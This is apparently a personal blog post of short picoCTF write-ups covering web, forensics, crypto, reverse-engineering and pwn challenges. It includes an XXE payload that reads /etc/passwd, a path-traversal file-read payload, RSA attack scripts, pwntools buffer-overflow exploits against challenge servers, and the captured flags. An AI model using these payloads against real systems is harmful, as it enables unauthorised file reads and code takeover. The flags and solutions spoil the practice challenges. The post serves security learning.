---
title: PicoCTF - Easy Peasy Or Bad Questions
tags: [PicoCTF, CTF]

category: "Security Practice｜PicoCTF｜Bad Questions"
date: 2024-01-31
---

# PicoCTF - Easy Peasy Or Bad Questions
<!-- more -->

## Challenge: [logon](https://play.picoctf.org/practice/challenge/46?category=1&page=1)🍰

### Exploit - Set cookie
![](https://i.imgur.com/lZ4wQUW.png)
![](https://i.imgur.com/OUTQtCP.png)


---

## Challenge: [where are the robots](https://play.picoctf.org/practice/challenge/4?category=1&page=1)🍰

### Exploit - robots.txt
Payload: `https://jupiter.challenges.picoctf.org/problem/56830/robots.txt`
![](https://i.imgur.com/LjqyriL.png)
Payload: `https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html`
![](https://i.imgur.com/NBKgAAg.png)

---

## Challenge: [Packets Primer](https://play.picoctf.org/practice/challenge/286?category=4&page=2)🍰

### Exploit - search `{` string directly
![](https://i.imgur.com/Qf0YaZz.png)

---

## Challenge: [Disk, disk, sleuth!](https://mercury.picoctf.net/static/920731987787c93839776ce457d5ecd6/dds1-alpine.flag.img.gz)🍰

### Exploit - Strings search
```bash
$ file dds1-alpine.flag.img.gz
dds1-alpine.flag.img.gz: gzip compressed data, was "dds1-alpine.flag.img", last modified: Tue Mar 16 00:19:24 2021, from Unix, original size modulo 2^32 134217728
$ gzip -d dds1-alpine.flag.img.gz
$ ls
dds1-alpine.flag.img
$ strings dds1-alpine.flag.img | grep "pico"
ffffffff81399ccf t pirq_pico_get
ffffffff81399cee t pirq_pico_set
ffffffff820adb46 t pico_router_probe
  SAY picoCTF{f0r3ns1c4t0r_n30phyt3_564ff1a0}
```

---

## Challenge: [Sleuthkit Apprentice](https://play.picoctf.org/practice/challenge/300?category=4&page=3)🍰

### Exploit - FTK Imager
![](https://i.imgur.com/4iZjRu6.png)

---

## Challenge: [St3g0](https://play.picoctf.org/practice/challenge/305?category=4&page=4)🍰

### Exploit - `zsteg`
![](https://i.imgur.com/kb2e72I.png)

---

## Challenge: [The Numbers](https://play.picoctf.org/practice?category=2&page=1)🍰

### Exploit - Alphabetic Sequence
A → 1
B → 2
...
Z → 26
Flag: `PICOCTF{THENUMBERSMASNO}`

---

## Challenge: b00tl3gRSA2🍰
Very similar to [Dachshund Attacks](https://hackmd.io/@SBK6401/Bk7LEmGwn)

[(5)低解密指數攻擊](https://zhuanlan.zhihu.com/p/76228394)

### Exploit - Large `e` in RSA
```python
import gmpy2
from Crypto.PublicKey import RSA
import ContinuedFractions, Arithmetic
from Crypto.Util.number import long_to_bytes 

def wiener_hack(e, n):
    # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !
    frac = ContinuedFractions.rational_to_contfrac(e, n)
    convergents = ContinuedFractions.convergents_from_contfrac(frac)
    for (k, d) in convergents:
        if k != 0 and (e * d - 1) % k == 0:
            phi = (e * d - 1) // k
            s = n - phi + 1
            discr = s * s - 4 * n
            if (discr >= 0):
                t = Arithmetic.is_perfect_square(discr)
                if t != -1 and (s + t) % 2 == 0:
                    print("Hacked!")
                    return d
    return False
def main():
    # n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597L
    # e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619L
    # c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192
    c = 56811169374970604258879254822752913202698796852666466049062507281296833525794733933911606542222058381462570064389043798511821976201439555996087100908424109130076018300965272821022540600753461592318517243041444023628038886623171367273746266838142957409528381844138653228764240191549418194103631719400458457467
    n = 58070026135855523239461918454846975979926839142742523564643445392568377118997543017140325578838063916989981257526294599185581601337665038563515627572917307698324180632146478826058737890134680323581229835600225464118844212164933670376706076943294749341174871787564338433388944984493037567781794408220522036263
    e = 36130176628708131522838994566654566009391592426941561879120208879371471770209863345391365424152782310438126184550592620601969503885509400986708473532710919272338089391139828798480407038661283690225490135620650318136420441354969537269806129891673717369657476436221539029150435924295108842265903755215180202497
    d = wiener_hack(e, n)
    m = pow(c, d, n)
    print(long_to_bytes(m))
if __name__=="__main__":
    main()
```

---

## Challenge: Sum-O-Primes🍰

### Source Code
```python
#!/usr/bin/python

from binascii import hexlify
from gmpy2 import mpz_urandomb, next_prime, random_state
import math
import os
import sys

if sys.version_info < (3, 9):
    import gmpy2
    math.gcd = gmpy2.gcd
    math.lcm = gmpy2.lcm

FLAG  = open('flag.txt').read().strip()
FLAG  = int(hexlify(FLAG.encode()), 16)
SEED  = int(hexlify(os.urandom(32)).decode(), 16)
STATE = random_state(SEED)

def get_prime(bits):
    return next_prime(mpz_urandomb(STATE, bits) | (1 << (bits - 1)))

p = get_prime(1024)
q = get_prime(1024)

x = p + q
n = p * q

e = 65537

m = math.lcm(p - 1, q - 1)
d = pow(e, -1, m)

c = pow(FLAG, e, n)

print(f'x = {x:x}')
print(f'n = {n:x}')
print(f'c = {c:x}')

```

### Exploit - Easy
題目給了$x=p+q$，而我們的目標是求出$(p-1)*(q-1)=pq-p-q+1=n-x+1$

Exploit Script
```python
from Crypto.Util.number import inverse, long_to_bytes

x = int("152a1447b61d023bebab7b1f8bc9d934c2d4b0c8ef7e211dbbcf841136d030e3c829f222cec318f6f624eb529b54bcda848f65574896d70cd6c3460d0c9064cd66e826578c2035ab63da67d069fa302227a9012422d2402f8f0d4495ef66104ebd774f341aa62f493184301debf910ab3d1e72e357a99c460370254f3dfccd9ae", 16)
n = int("6fc1b2be753e8f480c8b7576f77d3063906a6a024fe954d7fd01545e8f5b6becc24d70e9a5bc034a4c00e61f8a6176feb7d35fe39c8c03617ea4552840d93aa09469716913b58df677c785cd7633d1b7d31e2222cab53be235aa412ac5c5b07b500cf3fd5d6b91e2ddc51bff1e6eec2cb68723af668df36e10e332a9cbb7f3e2df9593fa0e553ed58afec2aa3bc4ae8ef1140e4779f61bdeae4c0b46136294cf151622e83c3d71b97c815b542208baa28207225f134c5a4feac998aeb178a5552f08643717819c10e8b5ec7715696c3bf4434fbea8e8a516dfd90046a999e24a0fb10d27291eb29ef3f285149c20189e7d0190417991094948180196543b8c91", 16)
c = int("16acf84a73cefd321ed491a15c640a495b09050cdce435ec37442faf9a694775e1ebffb6dbad6133cbc54e3f641506b0613f711625594fcb467f915f2708714b4c9936f5f4752c3299157cff4eb68eb82c0054dae351314829974f4feadaf126cda92b97e348dbef2640ec3a729a064e615df73d644700f93bf87579683e253d29622525bea3644f59aac8e0b2553bfea48d99e9b323e03cbf55166659974eb8c51cc7b2c2c5d6aa6c01b056a8ed7283d96656a3496f266726605af1be139d586f208d4d7c59c2771dc8036d490d3672ee4513301002775d7c39eac421c6cb4f01344e061549a4cb11c057accef1726572e447501004c772ec91b4a55811280f", 16)
e = 65537
phi = n - x + 1

d = inverse(e, phi)

print(long_to_bytes(pow(c, d, n)))
```

---

## Challenge: b00tl3gRSA3🍰

### Recon
* Description: Why use p and q when I can use more?
* Hint: There's more prime factors than p and q, finding d is going to be different.

和[這題](https://hackmd.io/@SBK6401/HyTTXZnPh)幾乎一樣

### Exploit - Smooth Value
1. 先用[online tool](https://www.alpertron.com/ECM.HTM)
    ```bash
    n = 9391862407×9430502773×10075292329×11026721677×11040417907×11226344687×11251922861×11323087873×11823788947×11956868381×11988198241×12275776127×12481146047×12665684987×12913613113×13994049331×14050490287×14654363873×15023405711×15220261411×15307561417×15368817697×15407160677×15542678147×15597563977×15670906213×15937323977×16033412617×16069849819×16364771063×16708525877×16824901871×16945613717×16989252559
    ```
2. 寫Script
    ```python
    from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse

    p_q_factor = [9391862407,9430502773,10075292329,11026721677,11040417907,11226344687,11251922861,11323087873,11823788947,11956868381,11988198241,12275776127,12481146047,12665684987,12913613113,13994049331,14050490287,14654363873,15023405711,15220261411,15307561417,15368817697,15407160677,15542678147,15597563977,15670906213,15937323977,16033412617,16069849819,16364771063,16708525877,16824901871,16945613717,16989252559]
    c = 205177004615238731351591289040361532005323127359264835947822740716983136768854567377695810379804519529001108024493036086993996665747898010286174708794831060625006137526368615944348139474971845237186225728575712792546002359378966044221352721991288514552994761886718307832529541998738515780841823857133357743562860987020334737036728017641876582542
    n = 325639898609361998216675485356547029510334941438608718141166837901883899013721165219381706028192734268885029193084232593567285725019760847868933043664019031900580901169223676044511691181256188001312697240016796398130516789089663998776488278420247724141996094725183171258977283897111350310752334184134343620555307982038647996863698517917545473309
    e = 65537

    phi = 1
    for i in range(len(p_q_factor)):
        phi = (p_q_factor[i] - 1) * phi

    d = inverse(e, phi)

    print(long_to_bytes(pow(c, d, n)))
    ```
Flag: `b'picoCTF{too_many_fact0rs_8606199}'`

---

## Challenge: SOAP🍰

### Exploit - The simplest XXE
Payload:
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]><data><ID>&xxe;</ID></data>
```

---

## Challenge: picobrowser🍰

### Exploit
才剛寫完[Who are you?](https://hackmd.io/@SBK6401/B135SD0w2)就覺得案情不單純，只要把header User-Agent變成picobrowser就可以了

Flag: `picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}`

---

## Challenge: Client-side-again🍰

### Exploit - Reverse Script
一開始先recon一下，我用burp抓了一下packet，發現他是把密碼在local端做驗證，所以要做的就只是要有耐心的分析一下source code

```javascript
<html>
<head>
  <title>Secure Login Portal V2.0</title>
</head>
<body background="barbed_wire.jpeg" >
  <!-- standard MD5 implementation -->
  <script type="text/javascript" src="md5.js"></script>

  <script type="text/javascript">
    var str_list=['f49bf}','_again_e','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this'];
    (function(_0x4bd822, _0x2bd6f7) {
        var _0xb4bdb3 = function(_0x1d68f6) {
            while (--_0x1d68f6) {
                _0x4bd822['push'](_0x4bd822['shift']());
            }
        };
        _0xb4bdb3(++_0x2bd6f7);
    }(str_list, 435));
    var _0x4b5b = function(var_1) {
        return str_list[var_1];
    };

    function verify() {
        checkpass = document[_0x4b5b('0')]('pass')[_0x4b5b('0x1')];
        if (checkpass[_0x4b5b('0x2')](0, 8) == _0x4b5b('0x3')) {
            if (checkpass[_0x4b5b('0x2')](7, 9) == '{n') {
                if (checkpass[_0x4b5b('0x2')](8, 16) == _0x4b5b('0x4')) {
                    if (checkpass[_0x4b5b('0x2')](3, 6) == 'oCT') {
                        if (checkpass[_0x4b5b('0x2')](24, 32) == _0x4b5b('0x5')) {
                            if (checkpass['substring'](6, b) == 'F{not') {
                                if (checkpass[_0x4b5b('0x2')](16, 24) == _0x4b5b('0x6')) {
                                    if (checkpass[_0x4b5b('0x2')](12, 16) == _0x4b5b('0x7')) {
                                        alert(_0x4b5b('0x8'));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } else {
            alert(_0x4b5b('0x9'));
        }
    }

  </script>
  <div style="position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:gray">
    <div style="text-align:center">
      <p>New and Improved Login</p>

      <p>Enter valid credentials to proceed</p>
      <form action="index.html" method="post">
        <input type="password" id="pass" size="8" />
        <br/>
        <input type="submit" value="verify" onclick="verify(); return false;" />
      </form>
    </div>
  </div>
</body>
</html>

```

Flag: `picoCTF{not_this_again_ef49bf}`

---

## Challenge: Forbidden Paths🍰
Description:
> We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?

### Exploit - Easy LFI
![](https://hackmd.io/_uploads/HyYkIrJO2.png)

* Payload: `filename=../../../../flag.txt&read=`
* Flag: `picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}`


---

## Challenge: keygenme🍰

### Source
IDA Main Function
```cpp
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char input_key[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("Enter your license key: ");
  fgets(input_key, 37, stdin);
  if ( check_key(input_key) )
    puts("That key is valid.");
  else
    puts("That key is invalid.");
  return 0LL;
}
```

IDA Check Flag Function
```cpp
__int64 __fastcall check_key(const char *input_key)
{
  int v2; // [rsp+18h] [rbp-C8h]
  int v3; // [rsp+18h] [rbp-C8h]
  int i; // [rsp+1Ch] [rbp-C4h]
  int j; // [rsp+20h] [rbp-C0h]
  int k; // [rsp+24h] [rbp-BCh]
  int m; // [rsp+28h] [rbp-B8h]
  char last_key[34]; // [rsp+2Eh] [rbp-B2h] BYREF
  char key[61]; // [rsp+50h] [rbp-90h] BYREF
  char v10; // [rsp+8Dh] [rbp-53h]
  char v11[72]; // [rsp+90h] [rbp-50h] BYREF
  unsigned __int64 v12; // [rsp+D8h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  strcpy(key, "picoCTF{br1ng_y0ur_0wn_k3y_");
  strcpy(last_key, "}");
  strlen(key);
  MD5();
  strlen(last_key);
  MD5();
  v2 = 0;
  for ( i = 0; i <= 15; ++i )
  {
    sprintf(&key[v2 + 32], "%02x", last_key[i + 2]);
    v2 += 2;
  }
  v3 = 0;
  for ( j = 0; j <= 15; ++j )
  {
    sprintf(&v11[v3], "%02x", last_key[j + 18]);
    v3 += 2;
  }
  for ( k = 0; k <= 26; ++k )
    v11[k + 32] = key[k];
  v11[59] = key[45];
  v11[60] = key[50];
  v11[61] = v10;
  v11[62] = key[33];
  v11[63] = key[46];
  v11[64] = key[56];
  v11[65] = key[58];
  v11[66] = v10;
  v11[67] = last_key[0];
  if ( strlen(input_key) != 36 )
    return 0LL;
  for ( m = 0; m <= 35; ++m )
  {
    if ( input_key[m] != v11[m + 32] )
      return 0LL;
  }
  return 1LL;
}
```

### Exploit
直接動態跑到最後看memory就會知道key是`picoCTF{br1ng_y0ur_0wn_k3y_19836cd8}`
![](https://hackmd.io/_uploads/SynfX-rtn.png)


---

## Challenge: basic-file-exploit:-1:

### Background
[strtol - c](https://www.runoob.com/cprogramming/c-function-strtol.html)

### Source Code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60


static const char* flag = "[REDACTED]";

static char data[10][100];
static int input_lengths[10];
static int inputs = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


static void data_write() {
  char input[100];
  char len[4];
  long length;
  int r;
  
  printf("Please enter your data:\n");
  r = tgetinput(input, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  while (true) {
    printf("Please enter the length of your data:\n");
    r = tgetinput(len, 4);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
  
    if ((length = strtol(len, NULL, 10)) == 0) {
      puts("Please put in a valid length");
    } else {
      break;
    }
  }

  if (inputs > 10) {
    inputs = 0;
  }

  strcpy(data[inputs], input);
  input_lengths[inputs] = length;

  printf("Your entry number is: %d\n", inputs + 1);
  inputs++;
}


static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, '\\0', 100);
  
  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}


int main(int argc, char** argv) {
  char input[3] = {'\\0'};
  long command;
  int r;

  puts("Hi, welcome to my echo chamber!");
  puts("Type '1' to enter a phrase into our database");
  puts("Type '2' to echo a phrase in our database");
  puts("Type '3' to exit the program");

  while (true) {   
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
    } else if (command == 1) {
      data_write();
      puts("Write successful, would you like to do anything else?");
    } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
    } else if (command == 3) {
      return 0;
    } else {
      puts("Please type either 1, 2 or 3");
      puts("Maybe breaking boundaries elsewhere will be helpful");
    }
  }

  return 0;
}

```

### Recon
這一題感覺真的不像PWN題，比較像是reverse
1. 注意讀取flag的地方是在`data_read()`的地方，且entry要是零

    我一開始的想法是往回推，所以要進到`data_read()`一開始的input就要選`2`，但會得到`No data yet`的結果，原因是input變數還是零(一開始的global variable有定義initia l value)
2. 所以現在必須要想如何才能改變input variable的變數，答案就是`data_write()`，當寫入字串成功時會在這個function的最後給予一個entry，其實就是`input++`得來的，所以我們要做的事情就是先寫任意的數值的database → 進入`data_read()`讀取entry 0的data

### Exploit - Reverse Carefully
```bash
nc saturn.picoctf.net 65317
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
123
123
Please enter the length of your data:
3
3
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}
```

---

## Challenge: buffer overflow 0🍰

### Source Code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

### Recon
這一題比想像中簡單，算是給新手認識BoF的機會，可以看到source code中寫到只要觸發segmentation fault就會轉給`sigsegv_handler`這個function把flag印出來，而會遇到segmentation fault的地方就是第18行的strcpy function，只要給的input length大於buf2就會產生

### Exploit - Simple BoF
```bash
$ nc saturn.picoctf.net 51532
Input: aaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}
```
實測需要輸入20個字元才會觸發

---

## Challenge: clutter-overflow🍰

### Recon
應該算是最簡單的BoF，可以用靜態或是動態的方式觀察offset有多少，然後把code的地方蓋成0xdeadbeef就可以拿到flag了

### Exploit
```python
from pwn import *

# r = process('chall')
r = remote("mars.picoctf.net", 31890)

r.recvuntil(b'What do you see?\n')
r.sendline(b'a' * (0x110-0x8) + p64(0xdeadbeef))

r.interactive()
```

Flag: `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`

---

## Challenge: wine:-1:

### Recon
這題很爛的原因是明明很簡單，但是用pwntools寫script卻沒辦法成功，但payload是一樣的，我有想過要用python -c的方式pipe out給server但一樣不成功，不知道為甚麼，看了其他人的WP也有提到一樣的問題，搞得我好亂啊啊啊啊啊啊啊!!!

(23/8/4)更新:打windows的題目要把new line改成\r\n，所以才會沒有成功

### Exploit
```bash
$ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0\x15@\x00" | nc saturn.picoctf.net 50417
Give me a string!
picoCTF{Un_v3rr3_d3_v1n_dcc38bed}
Unhandled exception: page fault on read access to 0x7fec3900 in 32-bit code (0x7fec3900).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:7fec3900 ESP:0064fe84 EBP:61616161 EFLAGS:00010206(  R- --  I   - -P- )
 EAX:00000000 EBX:00230e78 ECX:0064fe14 EDX:7fec48f4
 ESI:00000005 EDI:0021d6d0
Stack dump:
0x0064fe84:  00000000 00000004 00000000 7b432ecc
0x0064fe94:  00230e78 0064ff28 00401386 00000002
0x0064fea4:  00230e70 006d0da0 7bcc4625 00000004
0x0064feb4:  00000008 00230e70 0021d6d0 0077ccf9
0x0064fec4:  28364527 00000000 00000000 00000000
0x0064fed4:  00000000 00000000 00000000 00000000
Backtrace:
=>0 0x7fec3900 (0x61616161)
0x7fec3900: addb        %al,0x0(%eax)
Modules:
Module  Address                 Debug info      Name (5 modules)
PE        400000-  44b000       Deferred        vuln
PE      7b020000-7b023000       Deferred        kernelbase
PE      7b420000-7b5db000       Deferred        kernel32
PE      7bc30000-7bc34000       Deferred        ntdll
PE      7fe10000-7fe14000       Deferred        msvcrt
Threads:
process  tid      prio (all id:s are in hex)
00000008 vuln.exe
        00000009    0
0000000c services.exe
        0000000e    0
        0000000d    0
0000001f (D) Z:\challenge\vuln.exe
        00000020    0 <==
00000024 explorer.exe
        00000025    0
System information:
    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)
    Platform: i386
    Version: Windows Server 2008 R2
    Host system: Linux
    Host version: 5.19.0-1024-aws
```

(23/8/4)更新:New Exploit
```python
from pwn import *

r = remote("saturn.picoctf.net", 53396)
# r = process("./vuln.exe")
r.recvline()
context.newline = b'\r\n'
payload = b'a'*0x8c + p32(0x401530)
r.sendline(payload)

r.interactive()
```
Flag: `picoCTF{Un_v3rr3_d3_v1n_dcc38bed}`

---

## Challenge: Local Target🍰

### Recon
這一題超簡單，不知道為啥超少人解，就只是蓋掉原本的num變成65而已

### Exploit - Array Bound
```bash
$ echo "aaaaaaaaaaaaaaaaaaaaaaaaA" | nc saturn.picoctf.net 57591
Enter a string:
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

Flag: `picoCTF{l0c4l5_1n_5c0p3_fee8ef05}`

---

## Challenge: Picker IV🍰

### Recon
這一題也是超簡單但是不知道為啥也很少人解，單純的return 2 series
```bash
$ file picker-IV
picker-IV: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=12b33c5ff389187551aae5774324da558cee006c, for GNU/Linux 3.2.0, not stripped
$ checksec picker-IV
[*] '/mnt/d/NTU/CTF/PicoCTF/PWN/Picker IV/picker-IV'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ objdump -d -M intel ./picker-IV | grep "win"
000000000040129e <win>:
  4012d2:       75 16                   jne    4012ea <win+0x4c>
  4012f9:       eb 1a                   jmp    401315 <win+0x77>
  401319:       75 e0                   jne    4012fb <win+0x5d>
```

### Exploit - Ret2Funcntion
```bash
$ echo "40129e" | nc saturn.picoctf.net 50048
Enter the address in hex to jump to, excluding '0x': You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
```

Flag: `picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}`

---

## Challenge: Hurry up! Wait!🍰

### Recon & Prepare
```bash
$ file svchost.exe
svchost.exe: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dea7ec3bad6aeab52804d2a614b132f4af2a1025, stripped
$ checksec svchost.exe
[*] '/mnt/d/NTU/CTF/PicoCTF/Reverse/Hurry up! Wait!/svchost.exe'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
這一題唯一要注意的是可能會遇到
```bash
$ ./svchost.exe
./svchost.exe: error while loading shared libraries: libgnat-7.so.1: cannot open shared object file: No such file or directory
```
這個問題，所以只要安裝`libgnat-7`就可以了
```bash
$ sudo apt-get install -y libgnat-7
```
安裝完之後先執行看看，發現沒有任何output或是其他提示，所以用ida看了一下會發現他在`main->sub_298A()->ada__calendar__delays__delay_for(1000000000000000LL);`有檔一個delay，預期只要跳過這個地方就可以完成後續的step

### Exploit
```bash
$ gdb svchost.exe
gef➤  starti
gef➤  vmmap # 先確認code section的base address在哪
gef➤  b *(0x555555400000+0x2998)
gef➤  c
gef➤  j *(0x555555400000+0x299d)
```
這樣就可以拿到flag
Flag: `picoCTF{d15a5m_ftw_87e5ab1}`

---

## Challenge: droid0:-1:

### Recon & Prepare
這一題簡單到不可思議，難的地方是要想辦法把他run起來，不是指用android studio而是進入android studio之後，不確定是不是版本太舊或是其他原因他會一直噴錯，再加上是第一次使用這個工具，所以也不確定要看哪邊解決問題，所以如果有人遇到模擬器開不起來的狀況，可以看一下最右邊的notification，他會告訴你缺了甚麼，要不要安裝之類的簡單排除問題
![](https://hackmd.io/_uploads/r1N91a8Rn.png)

### Exploit
在emulator上隨便打一些字，然後click button，只要查看底下的log就會看到flag了
![](https://hackmd.io/_uploads/H1gJg6LA2.png)

Flag: `picoCTF{a.moose.once.bit.my.sister}`

---

## Challenge: WebNet1🍰

### Exploit - Import TLS Key / String Seach
承接[WebNet0]({{site.baseurl}}/PicoCTF-WebNet0/)，先import題目提供的private key解密中間所有的通訊，然後會看到中間有query一個網站，他提供了一張禿鷹的圖片，把圖片dump下來後直接string search就可以拿到flag
```bash
$ strings vulture.jpg | grep pico
picoCTF{honey.roasted.peanuts}
```

Flag: `picoCTF{honey.roasted.peanuts}`